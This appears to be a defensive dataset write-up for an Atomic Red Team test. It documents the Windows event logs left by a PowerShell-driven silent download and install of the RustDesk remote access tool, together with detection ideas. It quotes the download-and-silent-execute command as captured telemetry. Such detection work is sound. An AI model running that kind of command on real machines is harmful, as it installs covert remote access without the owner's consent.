# T1219-12: Remote Access Tools — RustDesk Files Detected Test on Windows

## Technique Context

T1219 (Remote Access Tools) covers adversaries deploying legitimate remote access software — tools that organizations might also use for legitimate IT administration — to maintain persistent access and control over compromised systems. The challenge for defenders is that these tools are functionally benign in the right context: they authenticate over encrypted channels, use vendor infrastructure for NAT traversal, and avoid many network-level signatures designed for overtly malicious traffic.

RustDesk is an open-source, cross-platform remote desktop tool written in Rust, roughly analogous to TeamViewer or AnyDesk. It has been observed in ransomware campaigns and business email compromise incidents where attackers use it to maintain access after initial compromise. Its open-source nature means anyone can build it, and its small binary footprint makes it easy to stage and execute.

This test simulates a realistic deployment scenario: download the RustDesk installer from GitHub using PowerShell's `Invoke-WebRequest`, then run it silently with `/S`. With Defender disabled, the installer runs fully and deploys its files to the system.

## What This Dataset Contains

**Security EID 4688** captures the PowerShell process spawning with the download-and-install command:

```
"powershell.exe" & {$file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
Invoke-WebRequest -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
Start-Process -FilePath $file "/S"}
```

The creator process is `powershell.exe` (PID 0x42b8, the ART test framework), and the new child PowerShell process (PID 0x38f4) carries the full command line including the GitHub download URL, the output file path, and the silent installation flag. A second EID 4688 shows the cleanup PowerShell (`Remove-Item $file1`) executing afterward.

**Sysmon EID 1** independently captures the child PowerShell process (PID 14580) with full command line, hash, and integrity level (`NT AUTHORITY\SYSTEM`). The command line shows `Invoke-WebRequest -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe` — the GitHub URL is directly observable.

According to the defended variant's analysis (which captured a complete successful run), **Sysmon EID 11** records the installer being written to `C:\Windows\System32\config\systemprofile\Desktop\rustdesk-1.2.3-1-x86_64.exe`, and subsequent EID 11 events document RustDesk components being installed to `C:\Windows\System32\config\systemprofile\AppData\Local\rustdesk\` — including `rustdesk.exe`, `RuntimeBroker_rustdesk.exe`, `flutter_windows.dll`, `librustdesk.dll`, and other DLL plugins. The installer was signed by "Zhou Huabing" with SHA256 `4996194639C099DB0D854D20832A64E6629FEFA37CE6A01FFD8710AC6C9E2522`.

**Sysmon EID 22 (DNS)** records two queries during the capture window, with lookups to `github.com` and the GitHub release asset delivery CDN.

**Sysmon EID 3 (network connection)** records two connection events, representing the HTTP/HTTPS connections to download the installer from GitHub.

**PowerShell EID 4103** captures `Join-Path` being invoked with `Path=C:\Windows\system32\config\systemprofile` and `ChildPath=Desktop\rustdesk-1.2.3-1-x86_64.exe`, directly recording the resolved install path. A second EID 4103 shows the cleanup `Remove-Item` cmdlet firing.

Total event counts: 0 Application, 120 PowerShell, 4 Security (EID 4688), 41 Sysmon.

The undefended dataset has 41 Sysmon events compared to 63 in the defended variant. The defended run generated more Sysmon events (likely due to Defender process activity), while this run captured the file download and installation chain.

## What This Dataset Does Not Contain

This test downloads and silently installs RustDesk but does not launch it for remote access. The dataset therefore contains no evidence of RustDesk actually establishing a remote session, no network connections to RustDesk relay infrastructure, and no RustDesk service registration events.

No **registry modification** events appear. RustDesk installation creates registry keys for service registration and autorun, but Sysmon's configuration in this environment does not capture registry events.

The installer execution itself — `rustdesk-1.2.3-1-x86_64.exe /S` — may or may not appear as a separate EID 1 event. The defended analysis documents it, but the undefended sample set does not include an EID 1 for the installer binary running. This gap means the dataset relies on PowerShell-channel evidence for the installation execution rather than a direct process creation event.

## Assessment

This is a high-value dataset for RAT deployment tradecraft. The GitHub download URL is preserved verbatim in both the Security EID 4688 command line and the Sysmon EID 1 record — a specific, searchable network indicator. The PowerShell EID 4103 cmdlet telemetry provides the resolved local file path. Together these channels document the complete delivery chain: source URL, destination path, and silent execution. The dataset is most useful for validating detection logic around `Invoke-WebRequest` downloading PE files to user profile paths, followed by silent process execution, particularly when the downloaded filename contains recognizable RAT tooling names.

## Detection Opportunities Present in This Data

The following behavioral observables are directly present in the event records:

- **Security EID 4688** captures the PowerShell command line containing `Invoke-WebRequest` downloading from `github.com/rustdesk/` followed by `Start-Process ... /S`. The combination of web download + silent install from a non-system path in a single PowerShell block is a high-fidelity behavioral indicator.
- **Sysmon EID 1** provides the full command line with the GitHub release URL, enabling URL-based detection even if the binary itself changes between versions.
- **PowerShell EID 4103** records `Join-Path` resolving `$env:USERPROFILE\Desktop\rustdesk-1.2.3-1-x86_64.exe`. The `.exe` filename containing a known RAT name being written to a Desktop path is directly observable in PowerShell module logging.
- **Sysmon EID 22** records DNS queries to GitHub and GitHub's CDN. A PowerShell process making DNS lookups to GitHub release infrastructure followed immediately by a file write to a Desktop path is a behavioral cluster worth modeling.
- **Sysmon EID 11** (as documented in the defended analysis) shows RustDesk components written to `AppData\Local\rustdesk\`. The specific DLL names (`librustdesk.dll`, `flutter_windows.dll`) can serve as file-presence indicators in environments where RustDesk is not expected.
